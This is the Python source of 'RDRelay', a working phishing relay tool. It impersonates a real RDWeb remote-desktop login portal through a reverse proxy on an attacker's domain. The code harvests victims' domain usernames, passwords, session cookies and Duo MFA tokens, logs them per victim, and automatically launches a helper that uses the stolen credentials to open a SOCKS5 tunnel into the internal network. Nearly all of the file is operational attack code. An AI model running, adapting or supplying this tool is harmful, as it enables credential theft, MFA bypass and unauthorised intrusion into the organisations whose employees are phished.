#!/usr/bin/env python3
"""RDRelay — RDWeb phishing relay to internal VPN.

Reverse-proxies an RDWeb portal, captures credentials and cookies on login,
then spawns rdetour.py per victim for a warm SOCKS5 tunnel into the internal
network. One phished login = one persistent tunnel with all survival logic.

Requires: aiohttp, lxml (optional, for XSLT transform)
"""
import argparse
import asyncio
import datetime
import gzip
import ipaddress
import json
import os
import re
import secrets
import signal
import ssl
import sys
import threading
import time
import zlib
from dataclasses import dataclass, field
from urllib.parse import parse_qs, urljoin, urlsplit

import aiohttp
from aiohttp import web

RDETOUR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "rdetour.py")


def _log(tag, *a):
    print("[%s]" % tag, *a, flush=True)


# ---------------------------------------------------------------------------
# Config
# ---------------------------------------------------------------------------

@dataclass
class Config:
    target: str = ""
    target_host: str = ""
    target_port: int = 443
    target_scheme: str = "https"
    target_aliases: list = field(default_factory=list)
    bind: str = "0.0.0.0"
    port: int = 443
    phish_domain: str = "localhost"
    no_tls: bool = False
    cert: str = ""
    out_dir: str = ""
    session_ttl: int = 3600
    no_killchain: bool = False
    socks_port_base: int = 1080
    verbose: bool = False

    @property
    def attacker_scheme(self):
        return "http" if self.no_tls else "https"

    @property
    def attacker_origin(self):
        default = 80 if self.no_tls else 443
        if self.port != default:
            return "%s://%s:%d" % (self.attacker_scheme, self.phish_domain,
                                   self.port)
        return "%s://%s" % (self.attacker_scheme, self.phish_domain)

    @property
    def upstream_origin(self):
        if self.target_port not in (80, 443):
            return "%s://%s:%d" % (self.target_scheme, self.target_host,
                                   self.target_port)
        return "%s://%s" % (self.target_scheme, self.target_host)


def parse_args(argv=None):
    ap = argparse.ArgumentParser(
        prog="rdrelay",
        description="RDWeb relay — phish-to-internal-VPN in one step")
    ap.add_argument("--target", required=True,
                    help="real portal URL, e.g. https://rds.corp.com")
    ap.add_argument("--target-alias", action="append", default=[],
                    help="additional upstream hostname to rewrite (repeatable)")
    ap.add_argument("--bind", default="0.0.0.0")
    ap.add_argument("--port", type=int, default=443)
    ap.add_argument("--phish-domain", required=True,
                    help="attacker-controlled domain (DNS must point here)")
    ap.add_argument("--no-tls", action="store_true",
                    help="plain HTTP (lab testing only)")
    ap.add_argument("--cert", default="",
                    help="PEM file (cert+key); omit for self-signed fallback")
    ap.add_argument("--out", dest="out_dir", default="./rdrelay-data",
                    help="output directory for sessions and certs")
    ap.add_argument("--session-ttl", type=int, default=3600)
    ap.add_argument("--no-killchain", action="store_true",
                    help="do NOT auto-spawn rdetour SOCKS on credential capture")
    ap.add_argument("--socks-port", type=int, default=1080,
                    help="base SOCKS port (each session gets base+n)")
    ap.add_argument("-v", "--verbose", action="store_true")
    a = ap.parse_args(argv)

    t = urlsplit(a.target if "://" in a.target else "https://" + a.target)
    if not t.hostname:
        ap.error("--target must include a host")

    return Config(
        target=a.target,
        target_host=t.hostname,
        target_port=t.port or 443,
        target_scheme=t.scheme or "https",
        target_aliases=a.target_alias,
        bind=a.bind, port=a.port, phish_domain=a.phish_domain,
        no_tls=a.no_tls, cert=a.cert,
        out_dir=os.path.abspath(a.out_dir),
        session_ttl=a.session_ttl,
        no_killchain=a.no_killchain,
        socks_port_base=a.socks_port,
        verbose=a.verbose,
    )


# ---------------------------------------------------------------------------
# URL rewriting
# ---------------------------------------------------------------------------

REWRITE_TYPES = (
    "text/html", "text/xml", "application/xml", "application/xhtml",
    "text/plain", "text/css", "application/javascript", "text/javascript",
    "application/x-javascript", "application/json",
)

HOP_HEADERS = {
    "connection", "keep-alive", "proxy-authenticate", "proxy-authorization",
    "te", "trailers", "transfer-encoding", "upgrade",
    "proxy-connection", "content-length", "content-encoding",
}


def _origin_variants(host, port, scheme_default):
    out = []
    schemes = ("https", "http")
    ports = {port} if port not in (80, 443) else set()
    if port == 443:
        ports.add(443)
    portstrs = [""] + [":%d" % p for p in sorted(ports)]
    for s in schemes:
        for ps in portstrs:
            out.append("%s://%s%s" % (s, host, ps))
    out.append("//%s" % host)
    return out


class UrlRewriter:
    def __init__(self, cfg):
        self.attacker_origin = cfg.attacker_origin
        pairs = []
        targets = [(cfg.target_host, cfg.target_port)] + \
            [(a, cfg.target_port) for a in cfg.target_aliases]
        for h, p in targets:
            for v in _origin_variants(h, p, cfg.target_scheme):
                pairs.append((v, self.attacker_origin))
        pairs.sort(key=lambda kv: -len(kv[0]))
        self._res = [
            (re.compile(re.escape(orig) + r"(?=[/\"'?\s<>&)])"), dst)
            for orig, dst in pairs
        ]

    def text(self, s):
        if not s:
            return s
        for rx, dst in self._res:
            if rx.search(s):
                s = rx.sub(dst, s)
        return s

    def location(self, value):
        return self.text(value)


def _rewrite_set_cookie(cookie_line):
    if not cookie_line:
        return cookie_line
    parts = cookie_line.split(";")
    kept = [parts[0]]
    for p in parts[1:]:
        if p.strip().lower().startswith("domain="):
            continue
        kept.append(p)
    return ";".join(kept)


def _parse_login_form(body_bytes, charset="utf-8"):
    try:
        fields = {k: v[0] for k, v in
                  parse_qs(body_bytes.decode(charset, "replace"),
                           keep_blank_values=True).items()}
    except Exception:
        return {}, None
    if "DomainUserName" not in fields or "UserPass" not in fields:
        return fields, None
    raw_user = fields.get("DomainUserName", "")
    pw = fields.get("UserPass", "")
    domain, _, user = raw_user.partition("\\")
    if not user:
        user, _, dom2 = raw_user.partition("@")
        if dom2:
            domain = dom2
        else:
            domain = ""
            user = raw_user
    return fields, {
        "domain": domain, "username": user,
        "password": pw, "raw_user": raw_user,
    }


# ---------------------------------------------------------------------------
# Duo detection
# ---------------------------------------------------------------------------

_DUO_API_HOST_RE = re.compile(
    r"(?:https?:)?(//)?((?:api-[a-z0-9][a-z0-9-]*|login)?\.?duosecurity\.com"
    r"(?::\d+)?(/[^\s\"'<>]*)?)", re.IGNORECASE)
_SIG_REQUEST_INPUT_RE = re.compile(
    r"<input[^>]*name=[\"']sig_request[\"'][^>]*value=[\"']([^\"']+)[\"']",
    re.IGNORECASE)
_SIG_REQUEST_INPUT_RE2 = re.compile(
    r"<input[^>]*value=[\"']([^\"']+)[\"'][^>]*name=[\"']sig_request[\"']",
    re.IGNORECASE)
_SIG_REQUEST_JS_RE = re.compile(
    r"sig_request['\"]?\s*[:=]\s*['\"]([^'\"]+)['\"]", re.IGNORECASE)
_DUO_IFRAME_RE = re.compile(
    r"<iframe[^>]*duo[^>]*src=[\"']([^\"']*duosecurity\.com[^\"']*)[\"']",
    re.IGNORECASE | re.DOTALL)
_DUO_FRAME_SID_RE = re.compile(r"[?&]sid=([^&\"'\s<>]+)", re.IGNORECASE)


def _extract_sig_request(text):
    for rx in (_SIG_REQUEST_INPUT_RE, _SIG_REQUEST_INPUT_RE2,
               _SIG_REQUEST_JS_RE):
        m = rx.search(text or "")
        if m:
            return m.group(1)
    return None


def _extract_duo_api_host(text):
    for m in _DUO_API_HOST_RE.finditer(text or ""):
        host = m.group(2)
        if host.startswith("api-"):
            return host.split("/")[0].split(":")[0]
    return None


def _extract_duo_iframe(text):
    m = _DUO_IFRAME_RE.search(text or "")
    if not m:
        return None, None
    src = m.group(1)
    sm = _DUO_FRAME_SID_RE.search(src)
    return src, (sm.group(1) if sm else None)


def _detect_duo(text):
    if not text:
        return None
    sig = _extract_sig_request(text)
    api = _extract_duo_api_host(text)
    iframe_src, sid = _extract_duo_iframe(text)
    has_frame = re.search(r"duo[_-]?iframe|Duo\.init", text, re.IGNORECASE)
    if not (sig or api or iframe_src or has_frame):
        return None
    return {
        "sig_request": sig, "api_host": api,
        "iframe_src": iframe_src, "iframe_sid": sid,
    }


def _duo_cookie_name(name):
    return (name or "").lower().startswith("duo") or \
        (name or "").lower() in ("aid",)


# ---------------------------------------------------------------------------
# Sessions
# ---------------------------------------------------------------------------

SESSION_COOKIE = "__rdwr_sid"
AUTH_COOKIE_MARKERS = ("tswaauthhttponlycookie", ".aspxauth", "rdwebauth",
                       "rdgatewayauth")


def _utcnow():
    return datetime.datetime.now(datetime.timezone.utc) \
        .isoformat(timespec="seconds")


class RelaySession:
    def __init__(self, store, sid=None):
        self.sid = sid or secrets.token_hex(8)
        self.store = store
        self.created = time.time()
        self.data = {
            "session_id": self.sid, "created": _utcnow(),
            "victim_ip": None, "user_agent": None,
            "credentials": None, "auth_state": "none",
            "cookies": {}, "duo": {}, "events": [],
            "killchain": None,
        }
        self.lock = threading.Lock()
        self.dir = os.path.join(store.dir, "sessions", self.sid)
        os.makedirs(self.dir, exist_ok=True)

    def event(self, kind, **kw):
        ev = {"ts": _utcnow(), "type": kind}
        ev.update(kw)
        self.data["events"].append(ev)
        self.save()

    def set_victim(self, ip, ua):
        self.data["victim_ip"] = ip
        self.data["user_agent"] = ua

    def capture_credentials(self, creds):
        self.data["credentials"] = creds
        self.data["auth_state"] = "credentials_captured"
        self.event("credentials_captured",
                   user="%s\\%s" % (creds.get("domain") or "?",
                                    creds.get("username") or "?"),
                   password_len=len(creds.get("password") or ""))

    def capture_cookies(self, set_cookie_lines):
        changed = []
        for line in set_cookie_lines:
            pair = line.split(";", 1)[0]
            if "=" not in pair:
                continue
            name, _, val = pair.partition("=")
            name, val = name.strip(), val.strip()
            if not name:
                continue
            if self.data["cookies"].get(name) != val:
                self.data["cookies"][name] = val
                changed.append(name)
        return changed

    def auth_cookie_seen(self):
        for name in self.data["cookies"]:
            if any(m in name.lower() for m in AUTH_COOKIE_MARKERS):
                return True
        return False

    def mark_auth_cookies(self):
        if self.data["auth_state"] in ("none", "credentials_captured"):
            self.data["auth_state"] = "auth_cookies_captured"
            self.event("auth_cookies_captured",
                       cookie_names=sorted(self.data["cookies"]))

    def capture_duo(self, info):
        d = self.data.setdefault("duo", {})
        for k, v in info.items():
            if v is not None and d.get(k) != v:
                d[k] = v
        self.save()

    def capture_duo_cookie(self, name, value):
        d = self.data.setdefault("duo", {}).setdefault("cookies", {})
        if d.get(name) != value:
            d[name] = value
            self.save()

    def save(self):
        self.store._save(self)

    def cookie_header(self):
        return "; ".join("%s=%s" % kv for kv in self.data["cookies"].items())


class SessionStore:
    def __init__(self, base_dir):
        self.dir = base_dir
        os.makedirs(os.path.join(base_dir, "sessions"), exist_ok=True)
        self._sessions = {}
        self._lock = threading.Lock()

    def _save(self, sess):
        tmp = os.path.join(sess.dir, ".session.json.tmp")
        with open(tmp, "w") as f:
            json.dump(sess.data, f, indent=2)
        os.replace(tmp, os.path.join(sess.dir, "session.json"))

    def get_or_create(self, sid, ip=None, ua=None):
        with self._lock:
            s = self._sessions.get(sid)
            if s is None:
                s = RelaySession(self, sid=sid)
                self._sessions[s.sid] = s
            if ip or ua:
                s.set_victim(ip, ua)
            return s

    def reap(self, ttl):
        now = time.time()
        with self._lock:
            dead = [s for s in self._sessions.values()
                    if now - s.created > ttl]
            for s in dead:
                del self._sessions[s.sid]
        return dead


# ---------------------------------------------------------------------------
# Harvest
# ---------------------------------------------------------------------------

# ---------------------------------------------------------------------------
# Kill chain
# ---------------------------------------------------------------------------

class KillChain:
    def __init__(self, cfg):
        self.cfg = cfg
        self.procs = {}
        self._lock = asyncio.Lock()

    def next_port(self):
        return self.cfg.socks_port_base + len(self.procs)

    def _creds_ok(self, sess):
        c = sess.data.get("credentials") or {}
        return bool(c.get("username")) and c.get("password") is not None \
            and bool(c.get("domain"))

    async def arm(self, sess):
        if self.cfg.no_killchain:
            return None
        async with self._lock:
            if sess.sid in self.procs:
                return self.procs[sess.sid][0]
            if not self._creds_ok(sess):
                return None
            c = sess.data["credentials"]
            domain = c["domain"]
            port = self.next_port()

        argv = [
            sys.executable, RDETOUR,
            "-g", self.cfg.target_host,
            "--gport", str(self.cfg.target_port),
            "-d", domain,
            "-u", c["username"],
            "-p", c["password"],
            "--socks-host", "127.0.0.1",
            "--socks-port", str(port),
            "--auth-timeout", "90",
        ]
        if c.get("nthash"):
            argv.extend(["--hashes", ":%s" % c["nthash"]])
        _log("killchain", "sid=%s: rdetour warm tunnel as %s\\%s on :%d"
             % (sess.sid, domain, c["username"], port))
        try:
            child_log = open(os.path.join(sess.dir, "rdetour.log"),
                             "ab", buffering=0)
        except Exception as e:
            _log("killchain", "child log open failed:", repr(e))
            return None
        try:
            proc = await asyncio.create_subprocess_exec(
                *argv, stdout=child_log, stderr=asyncio.subprocess.STDOUT)
        except Exception as e:
            child_log.close()
            _log("killchain", "spawn failed:", repr(e))
            return None
        async with self._lock:
            self.procs[sess.sid] = (port, proc)
        sess.data["killchain"] = {
            "socks_host": "127.0.0.1", "socks_port": port,
            "pid": proc.pid,
            "identity": "%s\\%s" % (domain, c["username"]),
        }
        sess.event("killchain_armed", socks_port=port, pid=proc.pid)
        _log("killchain",
             "sid=%s: SOCKS5 127.0.0.1:%d as %s\\%s via %s (log: %s)"
             % (sess.sid, port, domain, c["username"],
                self.cfg.target_host,
                os.path.join(sess.dir, "rdetour.log")))
        return port

    async def stop_all(self):
        async with self._lock:
            procs = list(self.procs.values())
            self.procs.clear()
        for _, proc in procs:
            try:
                proc.terminate()
            except Exception:
                pass
        for _, proc in procs:
            try:
                await asyncio.wait_for(proc.wait(), timeout=5)
            except Exception:
                try:
                    proc.kill()
                except Exception:
                    pass


# ---------------------------------------------------------------------------
# TLS
# ---------------------------------------------------------------------------

def _gen_selfsigned(hostname, path, days=825):
    from cryptography import x509
    from cryptography.hazmat.primitives import hashes, serialization
    from cryptography.hazmat.primitives.asymmetric import rsa
    from cryptography.x509.oid import NameOID
    key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
    name = x509.Name([x509.NameAttribute(NameOID.COMMON_NAME, hostname)])
    san = [x509.DNSName(hostname)]
    try:
        san = [x509.IPAddress(ipaddress.ip_address(hostname))]
    except ValueError:
        pass
    now = datetime.datetime.now(datetime.timezone.utc)
    cert = (x509.CertificateBuilder()
            .subject_name(name).issuer_name(name)
            .public_key(key.public_key())
            .serial_number(x509.random_serial_number())
            .not_valid_before(now - datetime.timedelta(days=1))
            .not_valid_after(now + datetime.timedelta(days=days))
            .add_extension(x509.SubjectAlternativeName(san), critical=False)
            .add_extension(x509.BasicConstraints(ca=False, path_length=None),
                           critical=True)
            .sign(key, hashes.SHA256()))
    pem = cert.public_bytes(serialization.Encoding.PEM) + \
        key.private_bytes(serialization.Encoding.PEM,
                          serialization.PrivateFormat.TraditionalOpenSSL,
                          serialization.NoEncryption())
    with open(path, "wb") as f:
        f.write(pem)
    os.chmod(path, 0o600)


def _ensure_cert(cfg):
    if cfg.cert:
        if not os.path.isfile(cfg.cert):
            raise SystemExit("cert file not found: %s" % cfg.cert)
        return cfg.cert, cfg.cert
    cert_dir = os.path.join(cfg.out_dir, "certs", cfg.phish_domain)
    os.makedirs(cert_dir, exist_ok=True)
    cert_p = os.path.join(cert_dir, "selfsigned.pem")
    if not os.path.exists(cert_p):
        _gen_selfsigned(cfg.phish_domain, cert_p)
        _log("tls", "generated self-signed cert:", cert_p)
    return cert_p, cert_p


# ---------------------------------------------------------------------------
# Reverse proxy
# ---------------------------------------------------------------------------

MAX_BUFFER = 8 * 1024 * 1024

_XSL_PI = re.compile(
    r'<\?xml-stylesheet\s+type=["\']text/xsl["\']\s+href=["\']'
    r'([^"\']+)["\']\s*\?>',
    re.IGNORECASE)
_xsl_cache = {}


async def _xslt_transform(xml_text, page_url, client):
    m = _XSL_PI.search(xml_text)
    if not m:
        return xml_text, False
    try:
        from lxml import etree
    except ImportError:
        return xml_text, False

    xsl_href = m.group(1)
    xsl_url = (xsl_href if xsl_href.startswith("http")
               else urljoin(page_url, xsl_href))

    async def _fetch(url):
        if url not in _xsl_cache:
            resp = await client.get(url, ssl=False)
            _xsl_cache[url] = await resp.read()
            resp.release()
        return _xsl_cache[url]

    try:
        xsl_bytes = await _fetch(xsl_url)
        clean_xml = re.sub(r'<\?xml-stylesheet[^?]*\?>\s*', '', xml_text)
        xml_doc = etree.XML(clean_xml.encode("utf-8"))

        baseurl = xml_doc.get("baseurl") or ""
        xsl_text = xsl_bytes.decode("utf-8", "replace")
        for dm in re.finditer(
                r"""document\s*\(\s*concat\s*\(\s*\$\w+\s*,"""
                r"""\s*['"]([^'"]+)['"]\s*\)\s*\)""", xsl_text):
            dep_url = baseurl + dm.group(1)
            if not dep_url.startswith("http"):
                dep_url = urljoin(page_url, dep_url)
            try:
                await _fetch(dep_url)
            except Exception:
                pass

        class _Resolver(etree.Resolver):
            def resolve(self, system_url, public_id, context):
                if system_url in _xsl_cache:
                    return self.resolve_string(
                        _xsl_cache[system_url], context)
                return None

        parser = etree.XMLParser()
        parser.resolvers.add(_Resolver())
        xsl_doc = etree.XML(xsl_bytes, parser)
        transform = etree.XSLT(xsl_doc)
        xml_doc = etree.XML(clean_xml.encode("utf-8"), parser)
        return str(transform(xml_doc)), True
    except Exception as e:
        _log("relay", "XSLT transform failed (%s), passing XML through" % e)
        return xml_text, False


def _strip_relay_cookie(header):
    if not header:
        return None
    keep = [p.strip() for p in header.split(";")
            if p.strip() and not p.strip().startswith(SESSION_COOKIE + "=")]
    return "; ".join(keep) if keep else None


def _charset_of(content_type):
    for part in content_type.split(";"):
        p = part.strip().lower()
        if p.startswith("charset="):
            return p[8:] or "utf-8"
    return "utf-8"


def _decompress(data, encoding):
    enc = (encoding or "").lower()
    if enc == "gzip":
        return gzip.decompress(data)
    if enc == "deflate":
        try:
            return zlib.decompress(data)
        except zlib.error:
            return zlib.decompress(data, -zlib.MAX_WBITS)
    return data


class RelayApp:
    def __init__(self, cfg, store, on_capture=None):
        self.cfg = cfg
        self.store = store
        self.rw = UrlRewriter(cfg)
        self.on_capture = on_capture
        self.clients = {}
        self.bg = set()
        self.timeout = aiohttp.ClientTimeout(total=None, connect=15,
                                             sock_read=180)

    async def close(self):
        for c in self.clients.values():
            await c.close()
        self.clients.clear()

    def _client_for(self, sess):
        c = self.clients.get(sess.sid)
        if c is None or c.closed:
            c = aiohttp.ClientSession(
                cookie_jar=aiohttp.DummyCookieJar(),
                timeout=self.timeout,
                connector=aiohttp.TCPConnector(ssl=False, limit=0),
            )
            self.clients[sess.sid] = c
        return c

    def _spawn(self, coro):
        t = asyncio.get_running_loop().create_task(coro)
        self.bg.add(t)
        t.add_done_callback(self.bg.discard)

    async def handle(self, request: web.Request) -> web.StreamResponse:
        if request.path in ("", "/"):
            raise web.HTTPFound("/RDWeb/Pages/en-US/login.aspx")

        cfg = self.cfg
        sid = request.cookies.get(SESSION_COOKIE)
        fresh = sid is None
        if fresh:
            sid = secrets.token_hex(8)
        sess = self.store.get_or_create(
            sid, ip=request.remote,
            ua=request.headers.get("User-Agent"))
        client = self._client_for(sess)
        upstream_url = cfg.upstream_origin + request.raw_path

        body = await request.read()
        ctype = request.headers.get("Content-Type", "")

        if request.method == "POST" and \
                "application/x-www-form-urlencoded" in ctype.lower():
            fields, creds = _parse_login_form(body)
            if creds:
                sess.capture_credentials(creds)
                _log("relay",
                     "CAPTURED creds %s\\%s (pw %d chars) sid=%s"
                     % (creds.get("domain") or "-", creds.get("username"),
                        len(creds.get("password") or ""), sess.sid))
            sr = fields.get("sig_response")
            if sr:
                sess.capture_duo({"sig_response": sr})
                sess.event("duo_sig_response_captured", len=len(sr))

        hdrs = {}
        for k, v in request.headers.items():
            lk = k.lower()
            if lk in HOP_HEADERS or lk in (
                    "cookie", "host", "accept-encoding", "content-type",
                    "content-length", "referer", "origin"):
                continue
            hdrs[k] = v
        hdrs["Accept-Encoding"] = "identity"
        if ctype:
            hdrs["Content-Type"] = ctype
        cookie_fwd = _strip_relay_cookie(request.headers.get("Cookie"))
        if cookie_fwd:
            hdrs["Cookie"] = cookie_fwd
        for h in ("Referer", "Origin"):
            v = request.headers.get(h)
            if v:
                hdrs[h] = v.replace(cfg.attacker_origin, cfg.upstream_origin)

        try:
            resp = await client.request(
                request.method, upstream_url,
                data=body if body or request.method == "POST" else None,
                headers=hdrs, allow_redirects=False)
        except aiohttp.ClientError as e:
            _log("relay", "upstream error:", repr(e))
            return web.Response(status=502, text="upstream error\n")

        out = web.StreamResponse(status=resp.status, reason=resp.reason)
        for k, v in resp.headers.items():
            lk = k.lower()
            if lk in HOP_HEADERS or lk in ("set-cookie", "date", "location"):
                continue
            out.headers[k] = v

        sc_lines = list(resp.headers.getall("Set-Cookie", []))
        sess.capture_cookies(sc_lines)
        for line in sc_lines:
            out.headers.add("Set-Cookie", _rewrite_set_cookie(line))
            pair = line.split(";", 1)[0]
            if "=" in pair:
                n, _, val = pair.partition("=")
                if _duo_cookie_name(n):
                    sess.capture_duo_cookie(n.strip(), val.strip())
        if fresh:
            sc = "%s=%s; Path=/" % (SESSION_COOKIE, sid)
            if not cfg.no_tls:
                sc += "; Secure"
            sc += "; HttpOnly; SameSite=Lax"
            out.headers.add("Set-Cookie", sc)
        loc = resp.headers.get("Location")
        if loc:
            out.headers["Location"] = self.rw.location(loc)

        if request.method == "HEAD":
            return out

        rctype = resp.headers.get("Content-Type", "")
        is_text = any(rctype.lower().startswith(t) for t in REWRITE_TYPES)

        try:
            if is_text and \
                    int(resp.headers.get("Content-Length", "0")) <= MAX_BUFFER:
                raw = _decompress(await resp.read(),
                                  resp.headers.get("Content-Encoding"))
                cs = _charset_of(rctype)
                text = raw.decode(cs, "replace")

                dinfo = _detect_duo(text)
                if dinfo:
                    sess.capture_duo(dinfo)
                    sess.event("duo_flow_detected",
                               api_host=dinfo.get("api_host"))

                is_xml = rctype.lower().startswith(
                    ("text/xml", "application/xml"))
                if is_xml and "<?xml-stylesheet" in text:
                    text, did = await _xslt_transform(
                        text, upstream_url, client)
                    if did:
                        out.headers["Content-Type"] = \
                            "text/html; charset=%s" % cs
                text = self.rw.text(text)
                data = text.encode(cs, "replace")
                out.headers["Content-Length"] = str(len(data))
                await out.prepare(request)
                await out.write(data)
                await out.write_eof()
            else:
                await out.prepare(request)
                async for chunk in resp.content.iter_any():
                    await out.write(chunk)
                await out.write_eof()
        except (ConnectionResetError, aiohttp.ClientConnectionError):
            pass
        finally:
            resp.release()

        if sess.data.get("credentials") and sess.auth_cookie_seen():
            if sess.data["auth_state"] in ("none", "credentials_captured"):
                sess.mark_auth_cookies()
                _log("relay",
                     "AUTH cookies captured sid=%s — trigger kill chain"
                     % sess.sid)
                if self.on_capture:
                    self._spawn(self.on_capture(sess))
        return out


# ---------------------------------------------------------------------------
# Entry point
# ---------------------------------------------------------------------------

async def _on_capture(sess, cfg, kc):
    try:
        await kc.arm(sess)
    except Exception as e:
        _log("relay", "killchain error sid=%s: %r" % (sess.sid, e))


async def _reaper(store, ttl):
    while True:
        await asyncio.sleep(60)
        for s in store.reap(ttl):
            _log("relay", "session expired:", s.sid)


async def run(argv=None):
    cfg = parse_args(argv)
    os.makedirs(cfg.out_dir, exist_ok=True)
    store = SessionStore(cfg.out_dir)
    kc = KillChain(cfg)

    relay = RelayApp(cfg, store,
                     on_capture=lambda s: _on_capture(s, cfg, kc))
    app = web.Application(client_max_size=MAX_BUFFER)
    app.router.add_route("*", "/{tail:.*}", relay.handle)
    app.on_cleanup.append(lambda _: relay.close())

    runner = web.AppRunner(app, access_log=None)
    await runner.setup()

    ssl_ctx = None
    if not cfg.no_tls:
        certf, keyf = _ensure_cert(cfg)
        ssl_ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
        ssl_ctx.load_cert_chain(certf, keyf)

    site = web.TCPSite(runner, cfg.bind, cfg.port, ssl_context=ssl_ctx)
    await site.start()

    socks = "OFF" if cfg.no_killchain else ":%d" % cfg.socks_port_base
    print("""
  RDRelay — RDWeb phishing relay
  Phish : %s
  Target: %s
  SOCKS : %s
  Output: %s
""" % (cfg.attacker_origin, cfg.upstream_origin, socks, cfg.out_dir),
          flush=True)

    reap_task = asyncio.ensure_future(_reaper(store, cfg.session_ttl))
    stop = asyncio.Event()
    loop = asyncio.get_running_loop()
    for sig in (signal.SIGINT, signal.SIGTERM):
        try:
            loop.add_signal_handler(sig, stop.set)
        except NotImplementedError:
            pass
    await stop.wait()

    reap_task.cancel()
    await kc.stop_all()
    await runner.cleanup()


def main():
    try:
        asyncio.run(run())
    except KeyboardInterrupt:
        pass


if __name__ == "__main__":
    main()
